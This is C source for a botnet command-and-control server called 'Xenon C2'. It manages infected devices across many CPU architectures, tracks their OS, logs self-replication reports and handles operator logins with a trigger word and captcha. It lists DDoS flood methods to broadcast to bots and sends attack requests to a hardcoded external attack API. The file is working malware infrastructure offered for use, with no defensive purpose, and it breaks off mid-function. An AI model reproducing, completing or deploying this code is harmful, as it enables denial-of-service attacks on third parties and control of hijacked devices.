/*Xenon C2 Writen by @Edo.py on Instagram
I am not claiming to make the C2 From Scratch 
but I did a good amount of work on it 
Added 
-IP Lookup
-Arch Count 
-OS Count
-api attack function for sending api attacks from the C2
-adduser
-deleteuser
-admin 
-black list
-max time
-max bots
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <err.h> 
#include <errno.h>
#include <ctype.h> 
#include <net/if.h> 
#include <dirent.h>
#include <signal.h>
#include <pthread.h>
#include <sys/time.h>   
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/limits.h>
#define MAXFDS 1000000

char *hostip = "62.4.21.139"; //Server Host IP

char *apiip = "178.128.228.130";//api IP NOT NEEDED

#define LOGINTRIGGER "Edo"
#define ADMIN "admin"
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3

int motdaction = 0;
int captcano = 1;
int logintrigger = 1;
char motd[512];

struct iplogging {
    char ip[1024];
} ipstructure[MAXFDS];                                                                                                                                                                                                                                                                                                                                 //Xenon Made by @Edo.py

struct login_info {
	char username[100];
	char password[100];
	char id[100];
	char apiaccess[100];
	char blacklist[50];
	int admin;
	int accessapi;
	int normaluser;
	int maxbots;
	int maxseconds;
	int connected;
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
        char arch[30];
		char os[100];

} clients[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

//Colors
#define W "\e[0m"//white
#define B "\e[34m"//blue
#define G "\e[32m"//green
#define LB "\e[96m"//light blue 
#define R "\e[31m"//red
#define BLA "\e[30m"//black

int ppc = 0;
int sh4 = 0;
int x86 = 0;
int armv4 = 0;
int armv5 = 0;
int armv6 = 0;
int armv7 = 0;
int mips = 0;
int m68k = 0;
int debug = 0;
int sparc = 0;
int mipsel = 0;
int unknown = 0;
int ubuntu = 0;
int gentoo = 0;
int centos = 0;
int opensuse = 0;
int freebsd = 0;
int dropbear = 0;
int openwrt = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void *removestr(char *buf,const char *rev) // credit to root.senpai for function
{
    buf=strstr(buf,rev);
    memmove(buf,buf+strlen(rev),1+strlen(buf+strlen(rev)));
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;                                                                                                                                                                                                                                                                                             // X E N O N   M A D E   B Y   E D O   
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close(sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
/*
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && accounts[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
*/

int apicall(char *type, char *ip, char *port, char *method, char *time)
{
    int Sock = -1;
    char request[1024];
    char host_ipv4[20];
    struct sockaddr_in s;
    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 3;
    Sock = socket(AF_INET, SOCK_STREAM, 0);
    s.sin_family = AF_INET;
    s.sin_port = htons(80);
    s.sin_addr.s_addr = inet_addr(apiip);
    if(strstr(type, "spoofed")) // add more or change to whatever u want
    { 
        snprintf(request, sizeof(request), "GET API.php?key=XenonAPI&host=%s&port=%s&time=%s&method=%s HTTP/1.1\r\nHost: %s\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\r\nConnection: close\r\n\r\n", ip, port, time, method, apiip);
    }
    connect(Sock, (struct sockaddr *)&s, sizeof(s));
    send(Sock, request, strlen(request), 0); // try now
    return 0;
}

void broadcast(char *msg, int us, char *sender, int maxbots)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < maxbots; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && accounts[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}

void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events; 
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) 
				{
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) 
					{ 
						close(infd); 
						continue; 
					}
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1; 
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					if(strstr(buf, "yeet: "))
					{
						removestr(buf, "yeet: ");
						printf("buf: \"%s\"\n", buf);
						FILE *LogFile2;
 						LogFile2 = fopen("selfreplog.log", "a");
  						fprintf(LogFile2, "%s\n", buf);
  						fclose(LogFile2);
					}
					if(strstr(buf, "OS: "))
					{
						removestr(buf, "OS: ");
						strcpy(clients->os, buf);
                        strcpy(clients[datafd].os, buf);
					}
					if(strstr(buf, "arch: "))
					{
						removestr(buf, "arch: ");
						strcpy(clients->arch, buf);
                        strcpy(clients[datafd].arch, buf);
					}
					if(strstr(buf, "botname: "))
					{
						removestr(buf, "botname: ");
						printf("%s\n", buf);
					}
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
				if (done) 
				{
					snprintf(client->arch, sizeof(client->arch), "%s", "timed-out");
            	    snprintf(client[datafd].arch, sizeof(client[datafd].arch), "%s", "timed-out");
					snprintf(client->os, sizeof(client->os), "%s", "timed-out");
            	    snprintf(client[datafd].os, sizeof(client[datafd].os), "%s", "timed-out");
					client->connected = 0;
					close(datafd);
				}
			}
		}
	}
}
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void countArch()
{
    int x;
    ppc = 0;
    sh4 = 0;
    x86 = 0;
    armv4 = 0;
    armv5 = 0;
    armv6 = 0; // im going to get off  ill write better bot coammnd tomarow ok
    armv7 = 0;
    mips = 0;
    m68k = 0;
    debug = 0;
    sparc = 0;
    mipsel = 0;
    unknown = 0;
    for(x = 0; x < MAXFDS; x++)
    {
        if(strstr(clients[x].arch, "ppc") && clients[x].connected == 1)
            ppc++;
        else if(strstr(clients[x].arch, "sh4") && clients[x].connected == 1)
            sh4++;
        else if(strstr(clients[x].arch, "x86") && clients[x].connected == 1)
            x86++;
        else if(strstr(clients[x].arch, "armv4") && clients[x].connected == 1)
            armv4++;
    	else if(strstr(clients[x].arch, "armv5") && clients[x].connected == 1)
            armv5++;
    	else if(strstr(clients[x].arch, "armv6") && clients[x].connected == 1)
            armv6++;
        else if(strstr(clients[x].arch, "armv7") && clients[x].connected == 1)
            armv7++;
        else if(strstr(clients[x].arch, "mpsl") || strstr(clients[x].arch, "mipsel") && clients[x].connected == 1)
            mipsel++;
        else if(strstr(clients[x].arch, "mips") && clients[x].connected == 1)
            mips++;
        else if(strstr(clients[x].arch, "m68k") && clients[x].connected == 1)
            m68k++;
        else if(strstr(clients[x].arch, "debug") && clients[x].connected == 1)
            debug++;
        else if(strstr(clients[x].arch, "sparc") && clients[x].connected == 1)
            sparc++;
        else if(strstr(clients[x].arch, "unknown") && clients[x].connected == 1)
            unknown++;
    }
}

void countos()
{
    int x;
    ubuntu = 0;
    gentoo = 0;
    centos = 0;
    opensuse = 0;
    freebsd = 0;
    dropbear = 0;
    openwrt = 0;
    unknown = 0;
    for(x = 0; x < MAXFDS; x++)
    {
        if(strstr(clients[x].os, "Ubuntu") && clients[x].connected == 1)
            ubuntu++;
        else if(strstr(clients[x].os, "Gentoo") && clients[x].connected == 1)
            gentoo++;
        else if(strstr(clients[x].os, "CentOS") && clients[x].connected == 1)
            centos++;
        else if(strstr(clients[x].os, "OpenSUSE") && clients[x].connected == 1)
            opensuse++;
    	else if(strstr(clients[x].os, "FreeBSD") && clients[x].connected == 1)
            freebsd++;
    	else if(strstr(clients[x].os, "Dropbear") && clients[x].connected == 1)
            dropbear++;
        else if(strstr(clients[x].os, "OpenWRT") && clients[x].connected == 1)
            openwrt++;
        else if(strstr(clients[x].os, "Unknowndis") && clients[x].connected == 1)
            unknown++;
    }
}

void negotiation(int sock, unsigned char *buf) {
    unsigned char c;

    switch (buf[1]) {
        case CMD_IAC:
            return;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
            c = CMD_IAC;
            send(sock, &c, 1, MSG_NOSIGNAL);
            if (CMD_WONT == buf[1])
                c = CMD_DONT;
            else if (CMD_DONT == buf[1])
                c = CMD_WONT;
            else if (OPT_SGA == buf[1])
                c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
            else
                c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);

            send(sock, &c, 1, MSG_NOSIGNAL);
            send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
            break;

        default:
            break;
    }
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
    char buf[2048];
	recv(datafd, buf, sizeof(buf), MSG_NOSIGNAL);
    negotiation(datafd, buf);
	if(strstr(accounts[datafd].blacklist, ipstructure[datafd].ip))
	{
		goto end;
	}
	
	int find_line;
	OperatorsConnected++;
    pthread_t title;
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s %s %d %d", accounts[j].username, accounts[j].password, accounts[j].id, accounts[j].apiaccess, &accounts[j].maxseconds, &accounts[j].maxbots);
		++j;
	}	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
        if(logintrigger == 1)
        {
            if(fdgets(buf, sizeof(buf), datafd) > 2);
            trim(buf);
            send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL);
            if(!strcmp(buf, LOGINTRIGGER))
            {
                if(captcano == 1)
                {
                    goto catpchaprompt;
                }
                else
                {
                    goto loginprompt;
                }

            }
            else
            {
                goto end;
            }
        }
        else
        {
            goto loginprompt;
        }
        
        
        

catpchaprompt:
        memset(buf, 0, sizeof(buf));
        int catpcha_number = rand() % 100000;
        char sendcatpcha[1024];

        sprintf(sendcatpcha, "Captcha(%d)\r\nEncter The Number Displayed: ", catpcha_number);
        send(datafd, sendcatpcha, strlen(sendcatpcha), MSG_NOSIGNAL); // i see whats happening
        if(fdgets(buf, sizeof(buf), datafd) > 2); // wtf this makes no sense
        trim(buf);
        printf("test: %s length: %d\n", buf, strlen(buf));
        if(atoi(buf) == catpcha_number)
            goto loginprompt;
        else
            goto end;
loginprompt:
        memset(buf, 0, sizeof(buf));
		char user [5000];	
		
        sprintf(user, ""G"Username"W":"W" ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
		sprintf(accounts[datafd].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, ""G"Password"W":"BLA" ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);

		char yes1 [500];
		
		sprintf(yes1,  "\e[0;91mPlease wait... I am verifying your credentials \e[97m[\e[0;91m|\e[97m]\r\n", accounts[find_line].username);
		
		
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes1, strlen(yes1), MSG_NOSIGNAL) == -1) goto end;
		
        goto Banner;
        }
void *TitleWriter(void *sock) 
{
	int datafd = (int)sock;
    char string[2048];
    while(1) 
	{
		memset(string, 0, 2048);
        sprintf(string, "%c]0; Xenon Devices [%d] | [%s] - Users Online [ %d ]%c", '\033', BotsConnected(), accounts[datafd].username, OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
	}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);




		char lmfao9asciibannerline0   [5000];
		char lmfao9asciibannerline1   [5000];
		char lmfao9asciibannerline2   [5000];
		char lmfao9asciibannerline3   [5000];
		char lmfao9asciibannerline4   [5000];
		char lmfao9asciibannerline5   [5000];
		char lmfao9asciibannerline6   [5000];
		char lmfao9asciibannerline7   [5000];
		char lmfao9asciibannerline8   [5000];
		if(motdaction == 1)
			sprintf(lmfao9asciibannerline0,   " "G" MOTD"W": %s\r\n", motd);
  		sprintf(lmfao9asciibannerline1,   " "G"                              ═╗ ╦╔═╗╔╗╔╔═╗╔╗╔                              \r\n");
  		sprintf(lmfao9asciibannerline2,   " "G"                              ╔╩╦╝║╣ ║║║║ ║║║║                             \r\n"); 
  		sprintf(lmfao9asciibannerline3,   " "G"                              ╩ ╚═╚═╝╝╚╝╚═╝╝╚╝                            \r\n"); 
  		sprintf(lmfao9asciibannerline4,   " "G"                  ╔═══════════════════════════════════╗                   \r\n"); 
  		sprintf(lmfao9asciibannerline5,   " "G"                  ║                                   ║                   \r\n"); 
  		sprintf(lmfao9asciibannerline6,   " "G"                  ║   "W"Type "G"HELP "W"For List Of Commands  "G"║       \r\n"); 
  		sprintf(lmfao9asciibannerline7,   " "G"                  ║                                   ║                   \r\n"); 
  		sprintf(lmfao9asciibannerline8,   " "G"                  ╚═══════════════════════════════════╝                   \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline0, strlen(lmfao9asciibannerline0), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline1, strlen(lmfao9asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline2, strlen(lmfao9asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline3, strlen(lmfao9asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline4, strlen(lmfao9asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline5, strlen(lmfao9asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline6, strlen(lmfao9asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline7, strlen(lmfao9asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline8, strlen(lmfao9asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, ""G"Xenon"W"@"G"%s"W": ", accounts[datafd].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        accounts[datafd].connected = 1;
		if(strstr(accounts[find_line].id, "admin"))
		{
			accounts[datafd].admin = 1;
			accounts[datafd].normaluser = 0;
		}
		else
		{
			accounts[datafd].admin = 0;
			accounts[datafd].normaluser = 1;
		}

		if(strstr(accounts[find_line].apiaccess, "access"))
		{
			accounts[datafd].accessapi = 1;
		}
		else
		{
			accounts[datafd].accessapi = 0;
		}
		

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "Edo")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    ""G"Bots Connected"W": "G"%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(statuscount, ""G"Duplicated Bots"W": "G"%d\r\n", TELFound, scannerreport);
				sprintf(ops,         ""G"Users Online"W": "G"%d\r\n", OperatorsConnected, scannerreport);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
		char input [5000];
        sprintf(input, ""G"Xenon"W"@"G"%s"W": ", accounts[datafd].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			
			if(strstr(buf, "methods")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char hp1  [800];
				char hp2  [800];
				char hp3  [800];
				char hp4  [800];
				char hp5  [800];
				char hp6  [800];
				char hp7  [800];
                char hp8  [800];



				sprintf(hp1,  ""G"╔════════════════════════════════════════════════════╗\r\n");
				sprintf(hp2,  ""G"║"W"TCP| !* TCP IP PORT TIME 32 all 1460 10 (TCP Flood) "G"║\r\n");
				sprintf(hp3,  ""G"║"W"UDP| !* UDP IP PORT TIME 32 1460 10     (UDP Flood) "G"║\r\n");
				sprintf(hp4,  ""G"║"W"STD| !* STD IP PORT TIME 1024        (STDHEX Flood) "G"║\r\n");
				sprintf(hp5,  ""G"║"W"VSE| !* VSE IP PORT TIME 32 1024 10  (VSE Flood)    "G"║\r\n");
				sprintf(hp6,  ""G"║"W"REDSYN| !* REDSYN IP PORT TIME         (REDSYN)     "G"║\r\n");
                sprintf(hp7,  ""G"║"W"KILLALL| !* KILLALL IP PORT TIME 1024  (KILLALL)    "G"║\r\n");
				sprintf(hp8,  ""G"╚════════════════════════════════════════════════════╝\r\n");



				if(send(datafd, hp1,  strlen(hp1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp2,  strlen(hp2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp3,  strlen(hp3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp6,  strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp7,  strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, hp8,  strlen(hp8), MSG_NOSIGNAL) == -1) goto end;

				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, ""G"Xenon"W"@"G"%s"W": ", accounts[datafd].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
        if(strstr(buf, "captcha on") && accounts[datafd].admin == 1)
        {
            captcano = 1;
        }
        if(strstr(buf, "captcha off") && accounts[datafd].admin == 1)
        {
            captcano = 0;
        }
        if(strstr(buf, "trigger on") && accounts[datafd].admin == 1)
        {
            logintrigger = 1;
        }
        if(strstr(buf, "trigger off") && accounts[datafd].admin == 1)
        {
            logintrigger = 0;
        }
 		if(strstr(buf, "help")) {
 			pthread_create(&title, NULL, &TitleWriter, sock);
 			char help1 [800];
 			char help8 [800];
 			char help2 [800];
 			char help3 [800];
 			char help4 [800];
            char helpc [800];
 			char help5 [800];
 			char helpe [800];
 			char help6 [800];
 			char help7 [800];
 			char helpa [800];
 			char helpb [800];


 			sprintf(help1, ""G"╔════════════════════════════════════════════╗\r\n");
 			sprintf(help8, ""G"║"W"methods| Shows Attack methods               "G"║\r\n");
 			sprintf(help2, ""G"║"W"admin| (ONLY FOR ADMINS)                    "G"║\r\n");
 			sprintf(help3, ""G"║"W"bots| Shows bot count and arch              "G"║\r\n");
 			sprintf(help4, ""G"║"W"oscount| Shows OS of Devices                "G"║\r\n");
            sprintf(helpc, ""G"║"W"api| Shows Api Attack Methods               "G"║\r\n");
 			sprintf(helpb, ""G"║"W"iplookup| iplookup [IP]                     "G"║\r\n");
 			sprintf(help5, ""G"║"W"plan| shows your max attack time            "G"║\r\n");
 			sprintf(helpe, ""G"║"W"Credit| Shows The Devs of Xenon             "G"║\r\n");
 			sprintf(help6, ""G"║"W"clear| Clears Screen                        "G"║\r\n");
 			sprintf(help7, ""G"╚════════════════════════════════════════════╝\r\n");
 			sprintf(helpa, ""G"                                      \r\n");




 			if(send(datafd, help1,  strlen(help1), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, help8,  strlen(help8), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, help2,  strlen(help2), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, help3,  strlen(help3), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, help4,  strlen(help4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, helpc,  strlen(helpc), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, helpb,  strlen(helpb), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, help5,  strlen(help5), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, helpe,  strlen(helpe), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, help6,  strlen(help6), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, help7,  strlen(help7), MSG_NOSIGNAL) == -1) goto end;
 			if(send(datafd, helpa,  strlen(helpa), MSG_NOSIGNAL) == -1) goto end;
 			

 			pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
 		sprintf(input, ""G"Xenon"W"@"G"%s"W": ", accounts[datafd].username);
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 		}
 		if(strstr(buf, "iplookup ")){
 			char myhost[20];
 			char tmp[1024];
 			snprintf(tmp, sizeof(tmp), "%s", buf);
 			trim(tmp);

 			char *token = strtok(tmp, " ");
 			snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
 			if(atoi(myhost) >= 8){
 				int ret;
 				int IPLSock = -1;
 				char iplbuffer[1024];
 				int conn_port = 80;
 				char iplheaders[1024];
 				char iplookup_host_token[20];
 				struct timeval timeout;
 				struct sockaddr_in sock;
 				timeout.tv_sec = 4; // 4 second timeout
 				timeout.tv_usec = 0;
 				IPLSock = socket(AF_INET, SOCK_STREAM, 0);
 				sock.sin_family = AF_INET;
 				sock.sin_port = htons(conn_port);
 				sock.sin_addr.s_addr = inet_addr(hostip);
 				if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1){
#ifdef DEBUG
                    //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
#endif
 					sprintf(user, "\x1b[31m[IPLookup] Failed to Connect to IPLookup Server...\r\n", myhost);
 					if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
 				}
 				else{
#ifdef DEBUG
                    //printf("[\x1b[32m+\x1b[37m] Connected to IPlookup Server)\n");
#endif
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*//*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, hostip);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0)){
#ifdef DEBUG
